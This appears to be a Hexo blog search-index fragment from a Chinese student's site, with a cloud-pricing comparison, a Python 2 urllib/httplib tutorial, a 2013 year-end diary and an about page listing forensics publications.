<p>计算了一下，一个微型实例有600兆左右内存和10G硬盘，除去系统要占用8G还剩下2G，及每月30G出入总流量。不过按照目前6.3的汇率，这样的实例，一年下来九百多块钱人民币。</p>
<p>下面是青云的价格表：</p>
<p><img width="50%" src="/image/2014-12-13-qing-price.png" alt="青云价格表"></p>
<p>综合来看，买青云低配 72 X 12 = 864</p>
<p>买亚马逊 EBS $0.013/h x 24 x 30 = $9.36 ~ ￥70</p>
<p>买亚马逊 SSD $$0.070/h x 24 x 30 = $50.400000000000006 ~ ￥350</p>
<p>买亚马逊的好处是可以在在右需要的时候更换成SSD，青云连SSD都没有。。。</p>
<p>而且，集成的周边服务比较完整。</p>
<p>如果说，网络稳定性，亚马逊中国应该就会好些。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python模块学习-1]]></title>
      <url>http://homeway.me/2014/04/04/Python-Module-Learning-1/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-python.png" alt="Python"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-urllib-amp-urllib2"><a href="#0x01-urllib-amp-urllib2" class="headerlink" title="0x01.urllib &amp; urllib2"></a>0x01.urllib &amp; urllib2</h1><p>参考地址：</p>
<p><a href="https://docs.python.org/2/library/urllib2.html" target="_blank" rel="external">https://docs.python.org/2/library/urllib2.html</a></p>
<h4 id="urllib-urlopen-url-data-proxies"><a href="#urllib-urlopen-url-data-proxies" class="headerlink" title="urllib.urlopen(url[, data[, proxies]])"></a>urllib.urlopen(url[, data[, proxies]])</h4><p>打开http，并且获取信息。</p>
<pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib  

res = urllib.urlopen(&#39;http://www.google.com&#39;).read() 
print res    
print &#39;http header:/n &#39;, res.info()  
print &#39;http status:/n &#39;, res.getcode()  
print &#39;url:/n &#39;, res.geturl()  

res.close()
</code></pre><h4 id="urllib-urlretrieve-url-filename-reporthook-data"><a href="#urllib-urlretrieve-url-filename-reporthook-data" class="headerlink" title="urllib.urlretrieve(url[, filename[, reporthook[, data]]])"></a>urllib.urlretrieve(url[, filename[, reporthook[, data]]])</h4><p>urlretrieve方法直接将远程数据下载到本地。</p>
<pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2  

def callback(a, b, c):  
    &#39;&#39;&#39;
    回调函数 
    @a: 已经下载的数据块 
    @b: 数据块的大小 
    @c: 远程文件的大小 
    &#39;&#39;&#39;  
    per = 100.0 * a * b / c  
    if per &gt; 100:  
        per = 100  
    print &#39;当前进度 ： %.2f%%&#39; % per  

url = &#39;http://homeway.me/&#39;  
local = &#39;homeway.html&#39;  
urllib.urlretrieve(url, local, callback)
</code></pre><hr>

<p>url2是url的一个增强。</p>
<h3 id="urllib2-urlopen-url-打开url"><a href="#urllib2-urlopen-url-打开url" class="headerlink" title="urllib2.urlopen(url)打开url"></a>urllib2.urlopen(url)打开url</h3><pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2

res = urllib2.urlopen(&#39;http://homeway.me&#39;)
print res.info()
print res.read()
# do something
response.close()  
</code></pre><h3 id="urllib2下载文件"><a href="#urllib2下载文件" class="headerlink" title="urllib2下载文件"></a>urllib2下载文件</h3><pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2

file = &quot;homeway.html&quot;
url = &quot;http://homeway.me/&quot;
response = urllib2.urlopen(url)

#open the file for writing
f = open(file, &quot;w&quot;)
f.write(response.read())
f.close()
</code></pre><h3 id="urllib2发送POST包"><a href="#urllib2发送POST包" class="headerlink" title="urllib2发送POST包"></a>urllib2发送POST包</h3><pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2 as lib2
import urllib

def main():
    req_url = &#39;http://homeway.me/&#39;;
    # 设置http报头
    req_headers = {
        &#39;Host&#39;: &#39;homeway.me&#39;,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Debian; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0&#39;,
        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
        &#39;Accept-Language&#39;: &#39;zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&#39;,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
        &#39;DNT&#39; : &#39;1&#39;,
        &#39;Connection&#39;: &#39;keep-alive&#39;,
        &#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded&#39;,
    }
    # 设置发包内容
    req_data ={
        &#39;url&#39; : &#39;http://homeway.me/&#39;,
    }
    req_body = urllib.urlencode( req_data )

    # urllib2提供 Request 类，用于添加http报头
    req = lib2.Request( req_url, req_headers )
    # 添加 post 数据
    res = lib2.urlopen( req, req_body )

    print res.read()

    res.close()

if __name__ == &#39;__main__&#39;:
    main()
</code></pre><h3 id="urllib2发送GET包"><a href="#urllib2发送GET包" class="headerlink" title="urllib2发送GET包"></a>urllib2发送GET包</h3><p>直接get请求，添加参数即可。</p>
<pre><code>url = &quot;http://homeway.me/?user=xiaocao&amp;pwd=123456&quot;
response = urllib2.urlopen(url)
</code></pre><h3 id="urllib2-HTTPError错误throw"><a href="#urllib2-HTTPError错误throw" class="headerlink" title="urllib2.HTTPError错误throw"></a>urllib2.HTTPError错误throw</h3><p>HTTP错误异常必须在前面，否则URL错误也会捕获一个HTTP错误。</p>
<pre><code>from urllib2 import Request, urlopen, URLError, HTTPError  
req = Request(someurl)  
try:  
    response = urlopen(req)  
except HTTPError, e:  
    print &#39;The server couldn/&#39;t fulfill the request.&#39;  
    print &#39;Error code: &#39;, e.code  
except URLError, e:  
    print &#39;We failed to reach a server.&#39;  
    print &#39;Reason: &#39;, e.reason  
</code></pre><h3 id="urllib2-URLError错误throw"><a href="#urllib2-URLError错误throw" class="headerlink" title="urllib2.URLError错误throw"></a>urllib2.URLError错误throw</h3><pre><code>#! /usr/bin/python
#-*- coding:utf-8 -*-

from urllib2 import Request, urlopen, URLError  
req = Request( &#39;http://homeway.me&#39; )  

try:  
    response = urlopen(req)  
except URLError, e:  
    if hasattr(e, &#39;reason&#39;):  
        print &#39;We failed to reach a server.&#39;  
        print &#39;Reason: &#39;, e.reason  
    elif hasattr(e, &#39;code&#39;):  
        print &#39;The server couldn/&#39;t fulfill the request.&#39;  
        print &#39;Error code: &#39;, e.code  
    else:
        print &#39;Unkown error!&#39;
</code></pre><h3 id="urllib2-Request还有很多函数"><a href="#urllib2-Request还有很多函数" class="headerlink" title="urllib2.Request还有很多函数"></a>urllib2.Request还有很多函数</h3><pre><code>...

req_body = urllib.urlencode( req_data )

req = lib2.Request( req_url, req_headers )
res = lib2.urlopen( req, req_body )

# 看名字就能知道的函数
req.add_data( {&#39;Accept-Encoding&#39;, &#39;utf-8&#39;} )
req.add_header( &#39;Accept-Encoding&#39;, &#39;utf-8&#39; )
print &#39;Has_header: &#39;,req.has_header(&#39;Accept-Encoding&#39;)
print &#39;Get_type: &#39;, req.get_type()
print &#39;Get_host&#39;, req.get_host()
print &#39;Get_selector&#39;, req.get_selector()
print &#39;Get_header&#39;, req.get_header( &#39;Accept-Encoding&#39;, default=None )
</code></pre><p><br><hr><br></p>
<h1 id="httplib"><a href="#httplib" class="headerlink" title="httplib"></a>httplib</h1><p>httplib有两个主要类HTTPConnection和HTTPResponse</p>
<h3 id="httplib-HTTPConnection-host-port-strict-timeout"><a href="#httplib-HTTPConnection-host-port-strict-timeout" class="headerlink" title="httplib.HTTPConnection ( host [ , port [ , strict [ , timeout ]]] )"></a>httplib.HTTPConnection ( host [ , port [ , strict [ , timeout ]]] )</h3><p>HTTPConnection类的构造函数，表示一次与服务器之间的交互，即请求/响应。参数host表示服务器主机，如：www.csdn.net；port为端口号，默认值为80； 参数strict的 默认值为false， 表示在无法解析服务器返回的状态行时( status line) （比较典型的状态行如： HTTP/1.0 200 OK ），是否抛BadStatusLine 异常；可选参数timeout 表示超时时间。</p>
<blockquote>
<p>HTTPConnection.connect ()</p>
<p>HTTPConnection.close ()</p>
<p>HTTPConnection.request ( method , url [ , body [ , headers ]] )</p>
</blockquote>
<p>调用request,方法会向服务器发送一次请求，method 表示请求的方法，常用有方法有get 和post;url 表示请求的资源的url;body 表示提交到服务器的数据;headers 表示请求的http 头。</p>
<blockquote>
<p>HTTPConnection.getresponse ()</p>
</blockquote>
<h3 id="httplib-HTTPResponse"><a href="#httplib-HTTPResponse" class="headerlink" title="httplib.HTTPResponse"></a>httplib.HTTPResponse</h3><blockquote>
<p>HTTPResponse.read([amt])<br>　　<br>HTTPResponse.getheader(name[, default])<br>　　<br>HTTPResponse.getheaders()<br>　　<br>HTTPResponse.msg<br>　　<br>HTTPResponse.version<br>　　<br>HTTPResponse.status</p>
</blockquote>
<p><br>　　<br>　　<br>看看事例吧：</p>
<pre><code>#! /usr/bin/python
# -*- coding: utf-8 -*-

import httplib

def main():
    req_host = &#39;homeway.me&#39;
    req_url = &#39;http://homeway.me&#39;;
    req_headers = {
        &#39;Host&#39;: &#39;homeway.me&#39;,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Debian; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0&#39;,
        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
        &#39;Accept-Language&#39;: &#39;zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&#39;,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
        &#39;DNT&#39; : &#39;1&#39;,
        &#39;Connection&#39;: &#39;keep-alive&#39;,
        &#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded&#39;,
    }
    req_data ={
        &#39;url&#39; : &#39;http://homeway.me/&#39;,
    }

    conn = httplib.HTTPConnection( req_host, 80, True )
    conn.request( method =&#39;GET&#39;, url = req_url, headers = req_headers, body=&#39;&#39; )
    res = conn.getresponse()

    print &#39;version:&#39;, res.version  
    print &#39;reason:&#39;, res.reason  
    print &#39;status:&#39;, res.status  
    print &#39;msg:&#39;, res.msg  
    print &#39;headers:&#39;, res.getheaders() 

    conn.close()

if __name__ == &#39;__main__&#39;:
    main()
</code></pre><p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-04-04-Python-Module-Learning-1"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-04-04-Python-Module-Learning-1" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/04/04/Python-Module-Learning-1/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/04/04/Python-Module-Learning-1/">http://homeway.me/2014/04/04/Python-Module-Learning-1/</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-04-04 21:55:38    </p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[再见2013，写下2014]]></title>
      <url>http://homeway.me/2014/01/02/goodbye-2013-hello-2014/</url>
      <content type="html"><![CDATA[<p><br><br>探头问一句，你好2014，我和你一样年轻！<br>小草主要博客：<a href="http://homeway.me/">http://homeway.me/</a></p>
<a id="more"></a>
<p><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhello2014.jpeg" alt=""></p>
<hr>

<p>&nbsp;&nbsp;&nbsp;&nbsp;最近比较忙，所以都没有时间写总结。<br>&nbsp;&nbsp;&nbsp;&nbsp;苦逼的学生，平时逃课一时爽，期末考试火葬场。<br>&nbsp;&nbsp;&nbsp;&nbsp;对不起，只有流水帐，原谅工科男没文采。<br><br></p>
<hr>

<div style="font-family:'微软雅黑';font-size:15px;"><br>&nbsp;&nbsp;&nbsp;&nbsp;2013，我想起去年这个时候，傻傻的，跟个脱了绳的风筝，以为自己见到了天堂。<br></div><br><div style="font-family:'微软雅黑';font-size:15px;"><br>&nbsp;&nbsp;&nbsp;&nbsp;2013，我想起去年这个时候，写下一片日志，《这一路走来》，这一路走来我都不后悔。<br></div><br><div style="font-family:'微软雅黑';font-size:15px;"><br>&nbsp;&nbsp;&nbsp;&nbsp;2013，我想起了去年，写过的，“佛境，从己到人到苍生，我不爱佛，但我爱佛境禅缘”<br></div><br><div style="font-family:'微软雅黑';font-size:15px;"><br>&nbsp;&nbsp;&nbsp;&nbsp;2013，收获真的好多，一如去年这么说。<br></div><br>&nbsp;&nbsp;&nbsp;&nbsp;接触IT只有一年多一点，也差不多是去年这个时候，我在模仿别人，修改别人的代码，学html，css，js，那时候是一个人，静静的，不想去接触别人，一个人安静地看。<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;我想到那时候，很多学长的鼓励，也许一辈子一也不会忘记的是，“因为我们是年轻人，所以我们喜欢折腾！”，不为了别的，只为一时欢愉自己，喜欢谢于宁”学姐“说的，“做自己喜欢的事情，永远不会累。”<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;去年的这个时候，我很羞涩，去了信息安全协会，又怕，自己什么也不懂，回来了。可能是吧，不知什么时候，认识了思思还有涂涂，感觉看到了另一片世界。毫无节操啊。其实那时候什么也不懂（其实现在也是什么都不懂，傻傻的写下这篇博客）,感觉那时候是一个转折点。<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;四月底，跑去搞活动了，网易校园大使，搞了一期“中国梦”主题活动，很感谢黑泽。阿泽一直是我的榜样。是这样一个拼搏的人，努力地找机会，不是学识，而是跳出学校，找到自己的世界。阿泽说的，大学最重要的，“兴趣和信息”！这也是我觉得的，简直是不谋而合！！<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;五月底，去跑”国家创新大赛“，虽然失败了，但是长了很多经验，就是这样，在一堆你都不知道的东西里，疯狂地找资料，学新的东西。大学给你什么？？见识，对，我觉得是见识还有机会！<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;六月，反正我很阴暗，第一次傻傻地表白。大概后来感觉自己有病，只是我不瞎搞。只要她开心就好了，喜欢一朵花，就让她绽放，静静的看着就好。灰色历史不提。<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;七月-八月，开始奔安协，开始有种想要疯狂地开始学东西的感觉。也是那时候，是这样的一个暑假，我，涂涂，思思不回家，不是因为不想家，只是想做自己喜欢的事情。那时候看了点chrome拓展，感觉自己又看到了一个好玩的东西。期间，做了个chrome记住访客登录人人，微博，杭电密码的小小拓展。你觉得，学东西什么最重要？兴趣！没别的，我们只是觉得好玩，看到了另一个世界！<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;九月，我不想开学！！我想玩linux了，我想玩php了！！什么都好，就是不想开学，其间玩了玩大一新生！第一次看php也大概是去年这个时候。“哇擦！！php那么多函数！！”那个时候感叹，一开始都是背些函数，其实都不知道在干嘛。嗯，一开学我就逃了2个礼拜的课。上课算个蛋！！老子还怕你不成。<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;十月，是开学了。开始走进协会的人，感觉每个人都是很好相处，很有想法，很积极的样子！！期间参加过谷歌GDG活动，阿里云开发者活动，开始走进华哥，鑫哥，何少，开始明白，协会的精神，分享、交流，真的是个好地方。很感谢华哥，带我走进很多东西，认识很多新东西，我也喜欢开源，开源是一种精神，吸收他人，反馈社会，分享交流的精神。<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;十一月，杭电第五届网络攻防大赛开始了，虽然我什么也不懂，只是干了点体力活，但是，看着全国很多地方的选手，真的觉得很多东西可以玩，自己什么也不懂，都是在瞎搞，搞搞。这个时候应该是在搞新浪服务器，想自写个博客网站。（其实，后来觉得真是，没策划好。）<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;十二月，跟华哥混熟了，开始跟华哥跑很多地方。呗塔豪斯看妹子，python交流大会长见识，还有华哥的项目，日志管理系统。华哥真的很厉害，详见<a href="http://opencdn.cc。期间，自己参加了院的创新项目，立项,“基于声波识别的手机刷卡系统”，这也是我看中的未来，手机客户端。这期间学了下python，做个网页抓取工具，抓取了杭电学生的信息，还有网页链接抓取，以及一些小东西，只为兴趣，感觉自己能弄出个愉悦自己东西，很开心。" target="_blank" rel="external">http://opencdn.cc。期间，自己参加了院的创新项目，立项,“基于声波识别的手机刷卡系统”，这也是我看中的未来，手机客户端。这期间学了下python，做个网页抓取工具，抓取了杭电学生的信息，还有网页链接抓取，以及一些小东西，只为兴趣，感觉自己能弄出个愉悦自己东西，很开心。</a><br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;还有，月底非常开心，收到segmengtfault送的朴林大大签名的《node.js》，还有五花肉妹子的几句鼓励的话，真的很开心！超感谢。@binarytree<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;2013，这一年真的好幸运，在我每个阶段都认识了一批很努力的人，有追求的人。感谢每个这样的人，出现在我生命里，给我带来新的力量！谢谢你们！<br><br><br><br><hr><br><br>2014，来了。<br>&nbsp;&nbsp;&nbsp;&nbsp;有好多东西想做，好多想法没去实现。好激动。是的，不是不睡觉，只是很激动，不是不读书，只是喜欢做自己喜欢的事情，2014 come on！！<br>&nbsp;&nbsp;&nbsp;&nbsp;2014，给自己一个梦。我想做的还有很多很多。<br><br><em> 首先，适应cents系统，超喜欢这种feel
</em> 多看看web响应式设计和ajax效果，还有php和mysql组合的网站源码<br><em> 用python跳出http协议，做一些有意思的东西；用python搭建网站，日志分析系统
</em> 学android，实现远程控制自己寝室台灯；用android，实现智能化，嵌入式<br><em> 想多参加社会活动，开发者大会，还有各种比赛
</em> 想多了解经融的东西，2014我要试试炒股<br>* 我想认识更多人，交流，分享<br><br><br><br><hr><br><br><div style="font-family:'微软雅黑';font-size:18px;"><br>夏日小草<br></div><br><div style="font-family:'微软雅黑';font-size:18px;"><br>2014-01-02,03.48<br></div>
]]></content>
    </entry>
    
  
  
    
    <entry>
      <title></title>
      <url>http://homeway.me/music/index.html</url>
      <content type="html"><![CDATA[<!DOCTYPE html>
<html>
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <title>夏日小草</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="As we do,as you know.">
    <meta property="og:type" content="website">
    <meta property="og:title" content="夏日小草">
    <meta property="og:url" content="http://homeway.me/index.html">
    <meta property="og:site_name" content="夏日小草">
    <meta property="og:description" content="As we do,as you know.">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="夏日小草">
    <meta name="twitter:description" content="As we do,as you know.">
    <meta name="twitter:creator" content="@xiarixiaocao">
    <link rel="publisher" href="yaohomeway">
    <link rel="stylesheet" href="http://lab.homeway.me/netease/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>
<body>
<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="back">
    <div class="container">
        <div class="player">
            <div id="cd" class="cd">
                <div class="out">
                </div>
                <div id="album" class="album">
                </div>
                <div id="in" class="in">
                </div>
            </div>
            <div class="action">
                <a href="javascript:m_play()" target="_blank" rel="external"><img id="m_play" src="http://lab.homeway.me/netease/images/play.png"></a>
                <input id="range" type="range" min="0" max="10" value="5" onchange="volume(this.value)">
                <a href="javascript:next_music()" target="_blank" rel="external"><img id="next_music" src="http://lab.homeway.me/netease/images/forward.png"></a>
            </div>
            <div class="info">
                <span id="music_name"></span><span id="artist"></span>
            </div>
            <div id="lrc" class="lrc">
            </div>
        </div>
    </div>
</div>
<audio id="player">
</audio>
<script src="http://xiaocao.u.qiniudn.com/blog/jquery.2.1.1.js"></script>
<script src="http://lab.homeway.me/netease/js/player.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>
</html>]]></content>
    </entry>
    
    <entry>
      <title></title>
      <url>http://homeway.me/about/index.html</url>
      <content type="html"><![CDATA[<h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><blockquote>
<p>夏日小草<br>Social: <a href="http://weibo.com/yaohomeway" target="_blank" rel="external">Weibo</a> | <a href="https://twitter.com/yaohomeway" target="_blank" rel="external">Twitter</a><br>Email: <a href="mailto:xiacoao.grasses#gmail.com" target="_blank" rel="external">xiacoao.grasses#gmail.com</a></p>
<p>Blog: <a href="http://homeway.me">http://homeway.me</a><br>Github: <iframe src="https://ghbtns.com/github-btn.html?user=grasses&#038;type=follow&#038;count=true&#038;size=normal" frameborder="0" scrolling="0" width="250px" height="20px"></iframe></p>
</blockquote>
<hr>

<h1 id="Education"><a href="#Education" class="headerlink" title="Education"></a>Education</h1><blockquote>
<p>Hangzhou Dianzi University&nbsp;&nbsp;(Undergraduate)    &nbsp;&nbsp;&nbsp;&nbsp;        Information Security    &nbsp;&nbsp;&nbsp;&nbsp;            2012.9-2016.6<br>Hangzhou Dianzi University&nbsp;&nbsp;(Master Graduate)    &nbsp;&nbsp;&nbsp;&nbsp;        Information Security    &nbsp;&nbsp;&nbsp;&nbsp;        2017.9-*</p>
</blockquote>
<hr>

<h1 id="Experience"><a href="#Experience" class="headerlink" title="Experience"></a>Experience</h1><blockquote>
<p>Department of online mall in <a href="https://meizu.com/" target="_blank" rel="external">Meizu Telecom Equipment Co., Ltd.</a>    - R &amp; D engineers    <strong>2015.9-2016.3</strong><br>The main task is to develop a <a href="https://store.meizu.com/" target="_blank" rel="external">Meizu online shoping system</a>, with high availability, and preventing malicious traffic attacks.</p>
</blockquote>
<hr>

<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><blockquote>
<p>My name is homeway, I’m currently a graduate student studying at School of cybersecurity, in <a href="http://www.hdu.edu.cn/" target="_blank" rel="external">Hangzhou Dianzi University (HDU)</a>.</p>
<p>I used to addict to high available in website development, and keened on in Hackthon. I call myself geek and love to develop a lot of gadgets to solve problems in life and enjoy problem-solving.</p>
<p>I’m currently mainly concern with machine learning and multimedia digital forensics, familiar with Convolution Neural Networks(CNN), and learn about Generative Adversarial Network(GAN), interest in common machine learning algorithms.</p>
</blockquote>
<hr>

<h1 id="Publications"><a href="#Publications" class="headerlink" title="Publications"></a>Publications</h1><div class="row paper-box"><br>    <div class="col-md-2 paper-image"><br>        <img src="https://static.blog.homeway.me/blog/paper/image/sci-training_pipeline.png"><br>    </div><br>    <div class="col-md-8 paper-content"><br>        <strong>Robust Multi-classifier for Camera Model Identification based on Convolution Neural Network [<a href="https://ieeexplore.ieee.org/document/8353219/" target="_blank" rel="external">Paper</a>, <a href="https://github.com/grasses/Camera-Identification" target="_blank" rel="external">Code</a>]<br>        </strong><br>        <span><b>Hongwei Yao</b>, Tong Qiao, Ming Xu, and Ning Zheng</span><br>        <span>IEEE Access (SCI-2)</span><br>        <span>May 2018</span><br>    </div><br></div><br><hr><br><div class="row paper-box"><br>    <div class="col-md-3 paper-image"><br>        <img src="https://static.blog.homeway.me/blog/image/RFM-algorithm.jpg"><br>    </div><br>    <div class="col-md-8 paper-content"><br>        <strong>Image Tampering Detection and Localization via Reliablity Fusing Map (In progress)[<a href="https://github.com/grasses/Tampering-Detection-and-Localization" target="_blank" rel="external">Code</a>]<br>        </strong><br>        <span><b>Hongwei Yao</b>, Ming Xu, Tong Qiao, et al.</span><br>        <span>Nov 2018</span><br>    </div><br></div>

<style type="text/css">
.paper-box {
    width: 100%;
    font-size: 1em;
    border-width: 2px;
    border-radius: 5px;
    border-style: solid;
    box-shadow: 2px 2px 2px #999999;
}

.paper-image {
    height: 200px;
    float: left;
    margin: 0px 20px;
}

.paper-image img {
    width: 200px;
}

.paper-content {
    margin-top: -50px;
}

.paper-content strong {
    font-size: 15px;
}
</style>]]></content>
    </entry>
    
  
</search>
